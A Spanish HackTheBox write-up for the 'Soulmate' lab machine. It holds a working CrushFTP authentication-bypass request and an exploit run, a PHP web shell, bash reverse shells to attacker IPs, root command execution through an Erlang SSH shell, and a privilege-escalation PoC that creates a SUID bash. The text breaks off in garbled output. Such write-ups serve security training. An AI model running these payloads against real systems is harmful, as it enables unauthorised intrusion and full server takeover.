---
title: Soulmate - Easy (HTB)
permalink: /Soulmate-HTB-Writeup/
tags:
  - Linux
  - Easy
  - CrushFTP
  - CVE-2025-31161
  - "Credentials Leakage"
  - "Erlang/OTP"
  - SSH
  - CVE-2025-32433
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Soulmate - Easy (HTB)
seo_description: Explota el servicio CrushFTP y un servidor SSH de Earlang/OTP para vencer Soulmate.
excerpt: Explota el servicio CrushFTP y un servidor SSH de Erlang/OTP para vencer Soulmate.
header:
  overlay_image: /assets/images/headers/soulmate-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/soulmate-hackthebox.jpg
---
![image-center](/assets/images/posts/soulmate-hackthebox.png)
{: .align-center}

**Habilidades:** Subdomain Fuzzing, CVE-2025-31161 - CrushFTP Authentication Bypass, System Enumeration, Credentials Leakage, Abusing `Erlang`/`OTP` SSH Server, CVE-2025-32433 - Pre-Auth RCE in `Erlang`/`OTP` SSH Server [Privilege Escalation]
{: .notice--primary}

# Introducción

Soulmate es una máquina Linux de dificultad `Easy` en HackTheBox donde debemos vulnerar un servidor web que tiene desplegado el servicio `CrushFTP` bajo un subdominio, el cual es vulnerable a CVE-2025-31161, el cual nos dará acceso administrativo y posterior acceso inicial subiendo archivos maliciosos.

Una vez estemos dentro de la máquina, abusaremos de un servidor `ssh` basado en `Earlang/OTP`, el cual es vulnerable a CVE-2025-32433, el cual nos permitirá ganar acceso completo al servidor.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.129.2.12             
PING 10.129.2.12 (10.129.2.12): 56 data bytes
64 bytes from 10.129.2.12: icmp_seq=0 ttl=63 time=494.714 ms

--- 10.129.2.12 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 494.714/494.714/494.714/0.000 ms
andrees@HackBookPro ~ $ 
~~~


## Port Scanning 

Comenzaremos con un escaneo de puertos que se encargue de descubrir puertos abiertos en la máquina víctima. Primeramente utilizaremos el protocolo TCP/IPv4

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.2.12 -oG openPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-12 23:37 -03

Nmap scan report for 10.129.2.12
Host is up (6.3s latency).
Not shown: 48933 filtered tcp ports (no-response), 16600 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 57.91 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Vemos dos servicios en la captura, `ssh` y `http`. Realizaremos un segundo escaneo para identificar la versión de los servicios expuestos que descubrimos

~~~ bash
nmap -p 22,80 -sVC 10.129.2.12 -oN services            
Starting Nmap 7.93 ( https://nmap.org ) at 2026-02-12 23:39 -03
Nmap scan report for 10.129.2.12
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.64 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Enumeration

En cuanto al servicio web, el servidor nos intenta aplicar una redirección hacia `soulmate.htb`. Agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para aplicar correctamente resolución `DNS`

``` bash
echo '10.129.2.12 soulmate.htb' | sudo tee -a /etc/hosts
10.129.2.12 soulmate.htb
```

Al navegar hasta `soulmate.htb`, veremos la siguiente página web. Este parece ser un sitio de citas

![image-center](/assets/images/posts/soulmate-1-hackthebox.png)
{: .align-center}

En cuanto a tecnologías web, podemos lanzar un escaneo posterior al ajuste en `/etc/hosts` para enumerarlas con la herramienta `whatweb`. 

Nuestro objetivo es detectar si se emplea algún gestor de contenido como un CMS, ver la versión del servidor web, etc.

``` bash
whatweb http://soulmate.htb/
http://soulmate.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[hello@soulmate.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.2.12], Script, Title[Soulmate - Find Your Perfect Match], nginx[1.18.0]
```

### Login Page

Desde la barra de navegación superior veremos el enlace `Login`, el cual nos lleva hasta la siguiente página para iniciar sesión: `/login.php`

![image-center](/assets/images/posts/soulmate-2-hackthebox.png)
{: .align-center}

### Register Page

Desde el enlace `Sign up here!` o desde el gran botón `Get Started` en la barra de navegación, seremos redirigidos a la siguiente web: `/register.php`, donde podremos crear una cuenta en la plataforma web

![image-center](/assets/images/posts/soulmate-3-hackthebox.png)
{: .align-center}

### Web Access

Al iniciar sesión con una nueva cuenta, el servidor nos llevará hacia `profile.php`

![image-center](/assets/images/posts/soulmate-4-hackthebox.png)
{: .align-center}

 Desde este punto podemos comenzar a probar abusar de alguna de las funcionalidades, como la subida de imágenes, intentos de inyección en los formularios, etc.

### (Failed) Directory Fuzzing

Como no vemos un vector claro del cual intentar abusar, podemos enumerar rutas o archivos dentro de este servidor web utilizando la técnica de `Fuzzing`.

> El `fuzzing` de directorios (también conocido como `Directory Fuzzing` o `Directory Bruteforcing`) es una técnica que puede encontrar rutas ocultas dentro de. un servidor web. 
> 
> Se utilizan diccionarios de rutas comunes para solicitar a la aplicación web cada ruta hasta agotar la lista.
{: .notice--info}

Herramientas como `feroxbuster` o `ffuf` son capaces de buscar directorios y/o archivos recursivamente en el servidor web

``` bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://soulmate.htb/ -x php,txt,html -r
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soulmate.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/
200      GET      306l     1061w    16688c http://soulmate.htb/index.php
403      GET        7l       10w      162c http://soulmate.htb/assets/
403      GET        7l       10w      162c http://soulmate.htb/assets/css/
403      GET        7l       10w      162c http://soulmate.htb/assets/images/
403      GET        7l       10w      162c http://soulmate.htb/assets/images/profiles/
```

### Subdomains / Virtual Hosts Fuzzing

Como no encontramos nada interesante con `Directory Fuzzing`, podemos optar por alternativas como `Fuzzing` a subdominios (`Subdomain Fuzzing`).

> Recordemos que un servidor web puede alojar múltiples nombres de dominio (sitios web). Para 
{: .notice--info}

Al igual que con los directorios, el `fuzzing` dirigido a enumerar subdominios puede encontrar sitios que no son visibles a simple vista 

``` bash
gobuster vhost -u http://soulmate.htb -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://soulmate.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
```

### `ftp.soulmate.htb`

Añadiremos este subdominio a nuestro archivo `/etc/hosts` para resolverlo  correctamente a través de `DNS` (debido a que estamos conectados por VPN a la red, no internet)

``` bash
sudo sed -i 's/soulmate.htb$/& ftp.&/' /etc/hosts
```

Al visitar el subdominio desde el navegador, veremos la siguiente página web del panel para iniciar sesión dentro de la plataforma

![image-center](/assets/images/posts/soulmate-5-hackthebox.png)
{: .align-center}

Dentro del código fuente de la web veremos la versión en algunas funciones `javascript`

![image-center](/assets/images/posts/soulmate-6-hackthebox.png)
{: .align-center}

Haciendo una simple búsqueda podemos dar con algunos CVEs que pueden aplicar a esta versión de `CrushFTP`

![image-center](/assets/images/posts/soulmate-7-hackthebox.png)
{: .align-center}

<br>


# Intrusión / Explotación
---
## CVE-2025-31161 - CrushFTP Authentication Bypass

CVE-2025-31161 es una vulnerabilidad en `CrushFTP`, concretamente las versiones anteriores a la `10.8.4` y `11` anterior a la `11.3.1`, permiten eludir la autenticación y ganar acceso administrativo a la plataforma

### Understanding Vulnerability

> `CrushFTP` es un software de servidor de transferencia de archivos seguro (`MFT` - `Managed File Transfer`) y multi-plataforma, utilizado para compartir datos confidenciales a través de Internet mediante protocolos como `SFTP`, `FTPS`, `HTTP`, `HTTPS` y `WebDAV`. 
{: .notice--info}

`CrushFTP` implementa el método de autenticación de `Amazon` (`AWS4-HMAC`), el formato es similar al siguiente

``` http
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

Para entender a nivel técnico cómo funciona este `bypass`, podemos consultar el siguiente post de [`Project Discovery`](https://projectdiscovery.io/blog/crushftp-authentication-bypass).

La autenticación dentro de `CrushFTP` comienza con el método `loginCheckHeaderAuth()`, el cual se activa cuando se recibe una solicitud `HTTP` que contiene una cabecera de autorización `S3`.

Cuando `username` no contiene una virgulilla (`~`), se llama a la función `login_user_pass()`, enviando el valor de `lookup_user_pass` en `true`

``` java
// Inside loginCheckHeaderAuth() in ServerSessionHTTP.java
if (this.headerLookup.containsKey("Authorization".toUpperCase()) && 
    this.headerLookup.getProperty("Authorization".toUpperCase()).trim().startsWith("AWS4-HMAC")) {
    // ...
    
    // Here, lookup_user_pass gets set to true by default
    boolean lookup_user_pass = true;
    
    // It only changes to false if the username contains a tilde
    if (s3_username3.indexOf("~") >= 0) {
        user_pass = user_name.substring(user_name.indexOf("~") + 1);
        user_name = user_name.substring(0, user_name.indexOf("~"));
        lookup_user_pass = false;
    }
    
    // The lookup_user_pass flag is then passed directly as the first parameter
    if (this.thisSession.login_user_pass(lookup_user_pass, false, user_name, lookup_user_pass ? "" : user_pass)) {
        // Authentication succeeds
    }
}
```

En la función `login_user_pass()`, existe un parámetro booleano llamado `anyPass`, el cual desde la llamada anterior contendrá el valor de la variable `lookup_user_pass`. 

Posteriormente, este valor se pasa a la función `verify_user()`

``` java
// Inside SessionCrush.java
public boolean login_user_pass(boolean anyPass, boolean doAfterLogin, String user_name, String user_pass) throws Exception {
    // Various validations and logging happen here

...
<SNIP>
...
            // Eventually we call verify_user with the anyPass parameter
            boolean verified = verify_user(user_name, verify_password, anyPass, doAfterLogin);
            
            if (verified && this.user != null) {
                // Authentication success handling
                return true;
            }
        }
    }
    
    return false;
}
```

En la función `verify_user()`,  lo crítico viene en que si `anyPass` es `true`, no necesitaremos un usuario para validar la autenticación

``` java
// Inside SessionCrush.java
public boolean verify_user(String theUser, String thePass, boolean anyPass, boolean doAfterLogin) {
    // Various user validation and formatting logic
...
<SNIP>
...
    // The critical check: if anyPass is true, we don't consider a null user to be an authentication failure
    if (!anyPass && this.user == null && !theUser2.toLowerCase().equals("anonymous")) {
        this.user_info.put("plugin_user_auth_info", "Password incorrect.");
    }
    
    // Various other checks and return logic
    return this.user != null;
}
```

El paso final está en el método `verify_user()`, donde el parámetro `anyPass` determina si se requiere verificación de contraseña

``` java
if (anyPass && user.getProperty("username").equalsIgnoreCase(the_user)) {
        return user;  // Authentication succeeds without any password check
    }
```

El problema está en que como inicialmente el servidor recibe una cabecera `AWS` de autorización, el servidor omite la validación de usuario y contraseña

### Proof of Concept

Un atacante puede enviar una cabecera de `AWS` para realizar el `Bypass` de autenticación.

> En este ejemplo obtendremos un listado de usuarios con el comando `getUserList`.
{: .notice--warning}

``` http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111 HTTP/1.1
Host: ftp.soulmate.htb

...
<SNIP>
...

Cookie: CrushAuth=1762138139030_JKnkdi2xCKJd1NAVQRQ9Eytd6I8UVl1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
```

Con `Burpsuite` interceptaremos una solicitud `HTTP` hacia el subdominio `ftp.soulmate.htb`, modificaremos las cabeceras y la `URL`

~~~ http
GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111 HTTP/1.1
Host: ftp.soulmate.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://ftp.soulmate.htb/WebInterface/UserManager/index.html
Connection: keep-alive
Cookie: CrushAuth=1762138139030_JKnkdi2xCKJd1NAVQRQ9Eytd6I8UVl1111
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
If-Modified-Since: Wed, 13 Aug 2025 18:46:10 GMT
If-None-Match: 1755110770160
Priority: u=0, i
~~~

Cuando enviemos la solicitud veremos un listado en `XML` con los usuarios válidos dentro de la plataforma

![image-center](/assets/images/posts/soulmate-8-hackthebox.png)
{: .align-center}

### Exploiting

Además, es posible hacer `bypass` de la autenticación para crear un usuario con permisos administrativos en la plataforma, podemos utilizar la siguiente [prueba de concepto](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

``` bash
# Virtual Environment with uv tool
uv venv
source .venv/bin/activate
uv pip install requests argparse

# Exploit
uv run cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user fakeadmin --password 'Test123!' 
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: fakeadmin
   [*] Password: Test123!.
```

Durante la ejecución del exploit, se crea un nuevo usuario enviando sintaxis `XML`

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<user type="properties">
<user_name>fakeadmin</user_name>
<password>Test123!</password>
<extra_vfs type="vector"></extra_vfs>
<version>1.0</version>
<root_dir>/</root_dir>
<userVersion>6</userVersion>
<max_logins>0</max_logins>
<site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site>
<created_by_username>crushadmin</created_by_username>
<created_by_email></created_by_email>
<created_time>1744120753370</created_time>
<password_history></password_history>
</user>

<?xml version="1.0" encoding="UTF-8"?>
<vfs type="vector">
</vfs>

<?xml version="1.0" encoding="UTF-8"?>
<VFS type="properties">
<item name="/">(read)(view)(resume)</item>
</VFS>
```

Desde `Burpsuite` la solicitud se ve de la siguiente manera, el servidor procesará la solicitud correctamente y retornará un código `HTTP 200 OK`

![image-center](/assets/images/posts/soulmate-9-hackthebox.png)
{: .align-center}


## Web Access

Ahora que hemos creado un nuevo usuario en la plataforma, iniciaremos sesión

![image-center](/assets/images/posts/soulmate-10-hackthebox.png)
{: .align-center}

Hemos creado un usuario con permisos administrativos, por lo que ahora podemos acceder al panel de administración desde la pestaña `Admin`

![image-center](/assets/images/posts/soulmate-11-hackthebox.png)
{: .align-center}

### User Management

Seleccionaremos la pestaña `User Management`, desde allí podremos administrar las cuentas de usuario dentro de la plataforma

![image-center](/assets/images/posts/soulmate-12-hackthebox.png)
{: .align-center}

Inspeccionando a los usuarios, veremos que `ben` tiene acceso a un directorio llamado `webProd`

![image-center](/assets/images/posts/soulmate-13-hackthebox.png)
{: .align-center}

Este directorio contiene los archivos de la web principal que vimos al principio. 

En este caso `ben` posee acceso de lectura y escritura, podemos darnos cuenta por el permiso `Upload` marcado con un `check` 

![image-center](/assets/images/posts/soulmate-14-hackthebox.png)
{: .align-center}

### Password Change

En este punto podremos intentar conectarnos a la plataforma como `ben` para poder acceder directamente a este directorio, ya sea para descargar estos archivos o para subir uno malicioso.

La forma más sencilla de acceder a la plataforma como el usuario `ben` es simplemente cambiando su contraseña, de la siguiente forma

![image-center](/assets/images/posts/soulmate-15-hackthebox.png)
{: .align-center}


## Web Access as `ben`

Cuando accedamos a `CrushFTP` como `ben`, si nos dirigimos al directorio `webProd`

![image-center](/assets/images/posts/soulmate-16-hackthebox.png)
{: .align-center}

Cuando estemos dentro de `webProd` nos aparecerá la opción para subir archivos desde el botón `Add Files`

![image-center](/assets/images/posts/soulmate-17-hackthebox.png)
{: .align-center}

### RCE

Como el servidor web contiene y ejecuta archivos `PHP`, intentaremos subir una web shell o una reverse shell en este lenguaje.

En mi caso elegí subir un archivo que actúe como una web shell, el cual contiene el siguiente código simple en `PHP`

``` php
<?php system($_GET['cmd']) ;?>
```

Este código simplemente ejecutará una instrucción con la función `system()` y recibirá el comando a través del parámetro `cmd` a través del verbo `HTTP` `GET`, por la URL

![image-center](/assets/images/posts/soulmate-18-hackthebox.png)
{: .align-center}

Cuando la subida se haya completado, nos dirigiremos hacia el sitio web principal (`soulmate.htb`).

Intentaremos ejecutar un comando a través de nuestra web shell o disparar la reverse shell (en caso de que hayas optado por esa opción)

![image-center](/assets/images/posts/soulmate-19-hackthebox.png)
{: .align-center}

Hemos validado que podemos ejecutar comandos, ahora intentaremos enviar algo más complejo como una reverse shell en `bash` hacia nuestra dirección IP

``` bash
bash -c 'bash -i >& /dev/tcp/10.10.X.X/443 0>&1'
```

Antes de enviar la reverse shell al servidor para que la ejecute, iniciaremos un listener por un puerto (en mi caso el `443`)

``` bash
nc -lvnp 443
```

Para evitar problemas con los caracteres especiales, necesitaremos aplicar `URL Encode` en el payload, de forma que la URL que visitaremos se verá similar a lo siguiente

``` bash
http://soulmate.htb/cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.11%2F443%200%3E%261%27
```


## Shell as `www-data`

Al enviar el comando en el navegador, al cabo de un momento recibiremos una shell como el usuario `www-data`

``` bash
nc -lvnp 443
Connection from 10.10.11.86:48168
bash: cannot set terminal process group (996): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:~/soulmate.htb/public$ 
```

### TTY Treatment

Realizaremos un tratamiento de la `TTY` para obtener una consola interactiva, que nos permita ejecutar atajos como `Ctrl+C` sin que el proceso de la shell termine

``` bash
www-data@soulmate:~/soulmate.htb/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@soulmate:~/soulmate.htb/public$ ^Z
[1]  + 8178 suspended  nc -lvnp 443
andrees@HackBookPro content $ stty raw -echo;fg
[1]  + 8178 continued  nc -lvnp 443
                                   reset xterm
```

Haremos unos ajustes adicionales de proporciones con el comando `stty`, además del tipo de terminal, que nos permitirá limpiar la pantalla con el atajo `Ctrl+L`

``` bash
www-data@soulmate:~/soulmate.htb/public$ export TERM=xterm
www-data@soulmate:~/soulmate.htb/public$ stty rows 42 columns 152
```


## System Enumeration

Hemos ganado acceso al servidor, procederemos con una enumeración del sistema para entender el contexto, permisos, etc. Además, enumeraremos vías potenciales de escalada de privilegios. 

> Personalmente me gusta enumerar manualmente de forma básica, si no encuentro algo, uso herramientas automatizadas como `LinPEAS`.
{: .notice--warning}

### Users

Al consultar el archivo `passwd` en busca de usuarios válidos en el sistema, veremos que existe solamente `ben` además de `root`

``` bash
www-data@soulmate:~/soulmate.htb/public$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```

### Processes Monitoring

En cuanto a procesos en ejecución, veremos que `root` ejecuta el recurso `start.escript`, bajo la ruta `erlang` en `/usr/local/lib`.

> [`Erlang`](https://www.erlang.org/) es un lenguaje de programación funcional y entorno de ejecución de código abierto, diseñado por Ericsson para sistemas distribuidos, tolerantes a fallos y en tiempo real de alta disponibilidad.
{: .notice--info}

``` bash
root         991  0.0  1.7 2256328 70844 ?       Ssl  Nov02   0:16 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```


## Credentials Leakage

Dentro del directorio `/usr/lib/local/erlang`, veremos dos archivos los cuales son utilizados por el proceso que está ejecutando `root`

``` bash
www-data@soulmate:~/soulmate.htb/public$ ls -la /usr/local/lib/erlang_login/
total 16
drwxr-xr-x 2 root root 4096 Aug 15  2025 .
drwxr-xr-x 5 root root 4096 Aug 14  2025 ..
-rwxr-xr-x 1 root root 1570 Aug 14  2025 login.escript
-rwxr-xr-x 1 root root 1427 Aug 15  2025 start.escript
```

Tenemos permisos de lectura para ambos, aprovecharemos esto para intentar ver información dentro de ellos.

Al consultar el archivo `start.escript`, notaremos que contiene unas credenciales casi al final

``` bash
www-data@soulmate:~/soulmate.htb$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```


## Shell as `ben`

Esta contraseña en texto claro supuestamente es válida para el usuario `ben`. Antes de intentar conectarnos con ella podemos validarla con herramientas como `netexec`

``` bash
nxc ssh soulmate.htb -u ben -p 'HouseH0ldings998'
SSH         10.129.2.173    22     soulmate.htb     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.13
SSH         10.129.2.173    22     soulmate.htb     [+] ben:HouseH0ldings998  Linux - Shell access!
```

La credencial es válida, por lo que podremos conectarnos por `ssh` como el usuario `ben`

``` bash
ssh -o StrictHostKeyChecking=no ben@soulmate.htb
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
ben@soulmate.htb\'s password: 
Last login: Fri Feb 20 17:12:27 2026 from 10.10.16.38
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

Ya podremos ver la flag del usuario sin privilegios dentro del directorio `/home/ben`

``` bash
ben@soulmate:~$ cat user.txt 
05e...
```
<br>


# Escalada de Privilegios
---
## Abusing `Erlang`/`OTP` SSH Server

Recordemos el archivo `start.script` desde donde obtuvimos las credenciales del usuario `ben`.

Este script en `Erlang` inicia un servidor `ssh` en el puerto `2222` localmente

``` bash
www-data@soulmate:~/soulmate.htb/public$ head -n 20 /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},
```

En teoría debería estar el puerto `2222` a la escucha, podemos comprobarlo con `netcat`

``` bash
nc -v 127.0.0.1 2222
Connection to 127.0.0.1 2222 port [tcp/*] succeeded!
SSH-2.0-Erlang/5.2.9
```

### SSH Access

Podemos conectarnos a este servidor `ssh` local con las credenciales de `ben`

> También podemos conectarnos como el usuario `www-data`, ojito ahí.
{: .notice--warning}

``` bash
ben@soulmate:~$ ssh ben@localhost -p 2222
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> 
```

Esta no es una terminal de Linux, sino que cambia la sintaxis por lenguaje `Erlang`, cada línea debe terminar con `.`.

Podemos ver el panel de ayuda con la función `help()`

``` bash
(ssh_runner@soulmate)1> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
...
<SNIP>
...
```

Como el usuario que ejecuta este servicio es `root`, podremos ejecutar cualquier acción privilegiada a través de esta shell.

Una forma de ejecutar comandos dentro de esta shell directamente podemos hacer uso del módulo [`os`](https://erlang.org/documentation/doc-5.8.4/lib/kernel-2.14.4/doc/html/os.html) y la función `cmd()`

``` bash
(ssh_runner@soulmate)3> os:cmd('id').

"uid=0(root) gid=0(root) groups=0(root)\n"
```


## Root Time

Podemos ejecutar un comando que directamente nos envíe una shell hacia nuestra máquina por un puerto.

Iniciaremos un listener que se encargue de recibir la conexión

``` bash
 nc -lvnp 4444
```

Ahora desde la shell del servidor `ssh` de `earlang`, ejecutaremos con la función `cmd()` un comando que entable una conexión hacia nuestro listener

``` bash
(ssh_runner@soulmate)2> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'").
```

Al ejecutar la instrucción, veremos que recibiremos una consola de `bash` como el usuario `root`

``` bash
nc -lvnp 4444
Connection from 10.129.2.173:55590
bash: cannot set terminal process group (158415): Inappropriate ioctl for device
bash: no job control in this shell
root@soulmate:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

### TTY Treatment

Realizaremos un pequeño tratamiento de la `TTY` como lo hicimos anteriormente con la shell que obtuvimos al principio

``` bash
root@soulmate:/# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@soulmate:/# ^Z
[1]  + 7337 suspended  nc -lvnp 4444
andrees@HackBookPro exploits $ stty raw -echo;fg                                                
[1]  + 7337 continued  nc -lvnp 4444
                                    reset xterm
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@soulmate:/# cat root/root.txt 
a19...
```


## (Intended) CVE-2025-32433 - Pre-Auth RCE in `Erlang`/`OTP` SSH Server

Buscando en internet acerca de vulnerabilidades asociadas a `Erlang/OTP SSH Server`, descubriremos que CVE-2025-32433 podría aplicar.

En versiones anteriores a `OTP-27.3.3`, `OTP-26.2.5.11` y `OTP-25.3.2.20`, un servidor `Earlang/OTP SSH` permite un atacante realizar una ejecución remota de código sin autenticación previa.

Podemos utilizar la siguiente [prueba de concepto](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC) para ejecutar comandos en el servidor `SSH`

``` bash
ben@soulmate:~$ python3 poc.py 127.0.0.1 -p 2222 --command 'cp /bin/bash /tmp/fakebash && chmod 4755 /tmp/fakebash'
[*] Target: 127.0.0.1:2222
[*] Connecting to target...
[+] Received banner: SSH-2.0-Erlang/5.2.9
^KN:c,ǃ
